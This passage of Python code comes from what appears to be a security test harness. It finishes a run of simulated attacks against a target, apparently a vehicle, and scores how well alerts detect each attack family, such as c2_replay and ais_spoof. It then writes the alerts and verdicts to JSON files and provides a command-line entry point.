    ais_stop.set()
    if ais_thread:
        ais_thread.join(timeout=2)

    # score detectability with the SAME logic used everywhere else in this
    # project, pointed at this run's own ground truth -- never mixes with
    # or reads the reference-vehicle attack_logs/.
    alerts_path = os.path.join(out_dir, "alerts.jsonl")
    with open(alerts_path, "w") as f:
        for a in alerts:
            f.write(json.dumps(a.as_dict()) + "\n")
    detectability = score_alerts(alerts_path, gt_dir=out_dir)
    results["detectability"] = detectability
    print(f"[test_target] detectability: {json.dumps({k: v['recall'] for k, v in detectability['families'].items()})}")

    out_path = os.path.join(out_dir, "verdicts.json")
    with open(out_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[test_target] wrote {out_path}")
    return results


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--attacks", default=None, help="comma-separated subset, e.g. c2_replay,ais_spoof")
    args = ap.parse_args()
    requested = args.attacks.split(",") if args.attacks else None
    run_target_test(args.target, requested)


if __name__ == "__main__":
    main()
